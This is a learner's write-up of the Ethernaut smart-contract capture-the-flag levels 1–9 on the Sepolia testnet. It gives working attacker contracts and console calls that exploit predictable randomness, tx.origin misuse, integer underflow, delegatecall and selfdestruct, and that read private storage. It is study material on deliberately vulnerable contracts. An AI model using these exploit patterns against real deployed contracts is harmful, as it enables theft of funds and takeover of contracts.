# Ethernaut docs
To help me get the most out of the Ethernaut CTF experience, I am writing up some documentation as I go. This is from the perspective of somebody who has some education about how blockchains work, but not much experience actually interfacing with them. Ethernaut was a great learning experience for me.

## Getting started: the absolute basics
While this is not intended as a comprehensive walkthrough, here are the things that were not obvious to me before I started this whole thing:
- The game is played in a test environment, but that environment is a real blockchain (Sepolia), you are interacting from a real wallet address, and using your "real" crypto "money" to execute transactions.
- This money is all in a test blockchain though, so you're not spending any "real money" to do this. You can't transfer value in or out of the Sepolia chain.
- You need the browser extension MetaMask to interface with the Sepolia chain via your browser. There are probably other ways to do this, but MetaMask is easy enough to use and no-commitment.
- In MetaMask, you will need to set up a new wallet address, and put some money in it. You can do this through a "faucet", which just gives you some (Sepolia-only) ETH. I got mine from [here](https://cloud.google.com/application/web3/faucet/ethereum/sepolia).
- A lot of the learning here, at least in the first handful of levels, is just figuring out how to interface with everything, often via the web3js console on the Ethernaut page, but also "externally" via things like RemixIDE.

## Level 1: Hello Ethernaut
This is just a tutorial level, which gets you to set up MetaMask, interact with basic functionality via the console, etc. At the end of the instructions you're asked to call the `.info()` method, which sends you on a trail of method calls which eventually gets you to call the `.authenticate()` method with the embedded password.

Once you have met the requirements the pass the level, you need to press "Submit Instance" on the ethernaut page to go to the next level.

## Level 2: Fallback
At this point we see our first solidity code and start sending our first "real" transactions. We win the level by taking ownership of the contract and withdrawing all of the contract's balance.

The first thing I did here was read through the solidity code. It didn't take long to find the route to taking ownership.

### A note on retrieving values
You can retrieve the owner of this contract with `await contract.owner()` again, but not so with the `contributions` field. This is a mapping, and we can't just print out the whole mapping. This actually makes sense, as Solidity mappings don't keep track of the keys that have non-default values stored in them (at least not in a way that we can access). There is therefore no sensible way to print the "whole" mapping, as its inputs are the entire input domain - i.e. every possible address.

We can, however, call `await contract.contributions(player)`, which gives us a pretty ugly result. This seems to be an obect containing a serialised representation of a number, which must be due to size constraints in JavaScript's numeric literals. It took me a while to figure this out, but we can get the value we want with one of the following:
```
(await contract.contributions(player)).toNumber();
(await contract.contributions(player)).toString();
```
I haven't yet dealt with numbers too big for JavaScript, but I'm guessing there's a point at which `toNumber()` is no longer viable, and I'm hoping that `toString()` is able to represent those very large numbers in string form.

### A note on sending ether with a method call
The next challenge in the interface for me was actually sending ether with a method call. The approaches we have used so far to call these methods have not involved sending any ether, or at least not specifying how much ether we send. This turned out to be pretty simple, but very poorly documented - I think the advice in the CTF level wanted us to google the phrase "How to send ether when interacting with an ABI" perhaps. This still pointed me to stackexchange answers, which is not documentation.

In the end, I was able to contribute 0.0005 ether with the following:
```
contract.contribute({value:web3.utils.toWei("0.0005", "ether")});
```

There is also a `toWei()` function available in the global scope, but I opted for the above method as it was better (instrinsically) documented.

### Actually solving the level
So far we have just been playing with the interface, but the way to solve this level is clear from looking at the `receive()` method: you just need to have a non-zero contribution, and then send some more ether to be received by the `receive()` method. This will grant you ownership, and then you can do what you want.

> A lesson from this level: many methods are "payable", but if you send a payment to a contract with no method name, it falls back to the `receive()` method.

But the next thing is again an interface question: how do I send some ether to this contract without specifying a method? Turns out this was pretty simple too:
```
contract.send(web3.utils.toWei("0.0005", "ether")); 
```

After this has gone through, we can see that we are now the owner by querying `await contract.owner()`. We have claimed ownership of the contract, we just need to reduce its balance to 0. This can be achieved with `contract.withdraw()` now that we are the owner. And that completes this level.

# Level 3: Fal1out
This is a funny one. It's an error that seems too obvious to be real. There's just a typo in the name of the constructor of this contract, which means the constructor was never called. It also means we are able to call the "constructor" method any time we want, which will make us the owner.
```
contract.Fal1out();
await contract.owner();
```

I waited a minute for the original transaction to go through. I could see this had happened when the owner changed, although I'm sure there would be another way in this interface to see when a transaction has been confirmed. This was all that was needed to complete this level.

# Level 4: Coin Flip
Now we are given a contract intended to make you guess the outcome a 50/50 event, and get it right 10 times in a row. You can make a guess with `contract.flip(bool_guess)`, and you can see the number you have guessed correctly so far with `(await contract.consecutiveWins()).toNumber()`.

From inspecting the contract, we can see that they are using the hash of the current (unconfirmed) to determine the coin flip's result. At first it looked like a parity check, but I think they are checking if the hash is greater or less than the large value stored in `FACTOR`, via integer division. I am assuming that `FACTOR` is half of the max value of a hash. It doesn't actually matter the intention, what matters is that we can do the same computation to predict what the outcome will be.

Now, this may be possible from the developer console - I had a quick look, and I think it's doable if you're kinda fast enough and you have access to the same `blockhash` function, but I don't want to try to replicate hashing and integer division semantics in JavaScript. The CTF level suggests we start moving outside of this environment, and it makes sense to make an attack contract here.

I won't give a setup guide for Remix, but I opened it for the first time and had it running in 5 minutes. I just had to set the environment to `Injected Provider - MetaMask` for it to connect to the Sepolia chain and associate with my wallet address on that chain.

I wrote up the following contract:
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Level4 {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address private flipAddress = [ethernaut's contract address here];

    function makeGuess() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(flipAddress).flip(side);
    }

}

interface CoinFlip {
  function consecutiveWins (  ) external view returns ( uint256 );
  function flip ( bool _guess ) external returns ( bool );
}
```

This just reproduces the logic to predict the guess, and calls the CTF contract to make the 'correct' guess. I don't bother to check that we are on a new block since the last guess, as calling too frequently will just cause a `revert`, which will cost me nothing except some gas fees.

The tricky part for a newcomer was figuring out how to call an external contract from within this contract, by address. It sounds like there are a few ways of doing this, but the `interface` method seems the safest and simplest. I manually wrote the interface myself the first time, but this didn't seem ideal, so instead I extracted the JSON ABI from the Ethernaut console with `JSON.stringify(contract.abi)`, which gave me the following:
```
[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"consecutiveWins","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view","constant":true,"signature":"0xe6f334d7"},{"type":"function","name":"flip","inputs":[{"name":"_guess","type":"bool","internalType":"bool"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable","signature":"0x1d263f67"}]
```

This is JSON though, and while there seems to be solidity libraries to import things like this, that seems complex. I'm not sure if there is a simpler method to get a solidity interface from the web3js contract, but I just pasted the above into an ABI/solidity translator [here](https://bia.is/tools/abi2solidity/), which spat out the interface you can see in the code above. All I had to do was change the interface name from `GeneratedInterface` to `CoinFlip`, which wasn't even strictly necessary.

Now I can compile and deploy this contract. There is a "Deploy" tab on the left bar in Remix. Make sure to select `CoinFlipper` instead of the `CoinFlip` interface when deploying. Once this is done, you should see an entry under "Deployed Contracts" with a big button called "makeGuess". Pressing this calls the associated method on our contract on-chain, which makes a (correct) coin flip guess on the CTF contract. After the block is confirmed, you can see this working back on the Ethernaut console with `(await contract.consecutiveWins()).toNumber()`.

> A lesson from this level: "random" is very difficult on most blockchains.

However, while pressing the button in Remix worked for me, I also wanted to know how to do this from the Ethernaut console. It turns out this is a bit tricky if you use `web3js` `Contract`s, but I'll show you the first way I got this working. First, I had to get the ABI and deployed address of my new `CoinFlipper` contract from Remix, which I used in the following on the Ethernaut console:
```
var flipperABI = [paste ABI here];
var flipperAddress = "[paste address here]";
var flipper = new web3.eth.Contract(flipperABI, flipperAddress);

// this saves you from specifying the 'from' address with each transaction
flipper.options.from = player;

await flipper.methods.makeGuess.call().send();
```
This is not quite as nice as the TruffleContract interface we have from Ethernaut's provided `contract`, but it's good enough for now.

We just need to make 10 correct guesses, either from the Remix interface or from the Ethernaut console, and then we have completed the level.

# Level 5: Telephone
Looking at the code, this is very similar to the previous level, except that all we have to do is make a call via a deployed contract, without needing to calculate any parameters. I quickly built the following contract, using a similar method as in Level 4:
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Level5 {
    address private telephoneAddress = [ethernaut's contract address here];

    function makeCall() external {
        Telephone(telephoneAddress).changeOwner(msg.sender);
    }
}

interface Telephone {
  function changeOwner ( address _owner ) external;
  function owner (  ) external view returns ( address );
}
```

It was a simple call to this deployed contract's `makeCall()` function that gave me ownership of the `Telephone` contract, completing the level.

> A lesson from this level: don't mix up `msg.sender` and `tx.origin`.


# Level 6: Token
A quick glance at the code doesn't show anything super out-of-place, but it was pretty simple to find the issue: integer underflow. And of course, you can see that the have specified Solidity version 0.6.0, as newer versions of the compiler take care of this sort of thing, afaik.

The comparison in `require(balances[msg.sender] - _value >= 0);` will always pass, as `_value` is unsigned, as is everything in `balances`. My first thought was just to send 30 tokens to myself, but this wouldn't work; it would subtract 30 tokens from my balance, resulting in me having a huge number of tokens (2^256-10, give or take off-by-one), but then that number would "increase" again by 30, causing it to *overflow* back to the original 20. The first thing I did was to deploy a contract to send some tokens to myself, but then I realised I didn't even need to do that. I just sent 30 tokens from myself to the address of one of my previously-deployed contracts.
```
contract.transfer("[address of deployed contract]", 30);
```
> A lesson from this level: integer overflow and underflow can break everything. Use a newer version of the Solidity compiler and/or SafeMath. Although there are still ways to cause under/overflow in the latest compiler version too.

Calling the above completed the level for me.

# Level 7: Delegation
First glance of this contract shows me `delegatecall`, which is super interesting. Since you can't update contracts once they are deployed, it's common for contracts to simply be shells that point to implementations elsewhere, and `delegatecall` allows for method calls to be forwarded from contract A to contract B, such that contract B's code executes *on contract A's memory*. That last part is important.

So, if we can get the `Delegation` contract to make a `delegatecall` to the `Delegate` contract's `pwn` function, then it will set `owner` to us, but that `owner` will be pointing back to the memory of `Delegation`, et voila, we will be the new owners.

> A lesson from this level: `delegatecall` can be dangerous. Use it carefully.

However, now we are dealing with some more low-level transaction crafting, and it'll take a bit of learning to figure out how to make the right transaction request here.

Firstly, we will need the method ID for the `pwn()` method. This is just the first 4 bytes of the keccak256 hash of the string representing the method signature. For `pwn()`, that is `dd365b8b`, which I got from [here](https://emn178.github.io/online-tools/keccak_256.html). If we wanted to also send some parameters with our transaction, that would get a bit more complex, but luckily `pwn()` takes no parameters.

In the end it was a very simple invocation in the Ethernaut console that gave me the result I wanted:
```
sendTransaction({to:contract.address, from:player, data:"dd365b8b"});
```
It seems that web3js etc took care of all the other details, such as gas price, gas allocation, etc. I'm glad I didn't need to dive into all of those details myself.

# Level 8: Force
This is another strange one. We are faced with a contract that has no payable methods and no fallbacks defined. It turns out some contracts really don't want to receive any payments, but there is a tricky way to force a payment on somebody: a contract can self-destruct, and when this happens it sends its entire balance to an address. That address is forced to receive the balance.

It's a bit weird that `selfdestruct()` exists - it looks like there's some interesting history behind it. Nevertheless, it does exist and it's a way to force payment to an address that doesn't have payment fallbacks. I built the following contract that can receive payment and immediately self-destruct, sending its balance to a supplied address.
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Level7 {
    function boom(address payable beneficiary) payable external {
      selfdestruct(payable(address(beneficiary)));
    }
}
```

After deploying this, I created a web3js contract similarly to in previous levels, and then called the `boom()` method with the level contract's address, along with some ether for it to then disperse on self-destruction, using the following invocation:
```
con.methods.boom(contract.address).send({value:web3.utils.toWei("0.0001", "ether")})
```
This completed the level.

#Level 9: Vault

Here, we can unlock the vault if we know the password. The `password` field is private, but of course everything on a blockchain is public, so of course that's going to be stored somewhere.

My first thought was that the password would be encoded on the transaction that called the constructor and created the contract. But then it occurred to me that it will just be in the contract's state, and that is probably easier to find (although both are public). This still took a bit of looking around - I thought I'd find the data I needed more quickly on etherscan etc, but in the end there is a simple web3js method that gets me what I need.
```
await web3.eth.getStorageAt(contract.address, 0)
-> 0x0000000000000000000000000000000000000000000000000000000000000001
```

The above gave me the first 32 bytes of storage, and looks suspiciously like a boolean `true`. This makes sense as the first part of storage, as the boolean variable `locked` is declared before `password`. The next entry is:

```
await web3.eth.getStorageAt(contract.address, 1)
-> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

This is some raw binary data. My first thought was that I'd need to decode this somehow, but the type of `password` is just `bytes32`, so I was able to complete the level with the following invocation:

```
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29");
```

> A lesson from this level: eveything on-chain is public. This is why zero-knowledge proofs are so important in blockchain work.
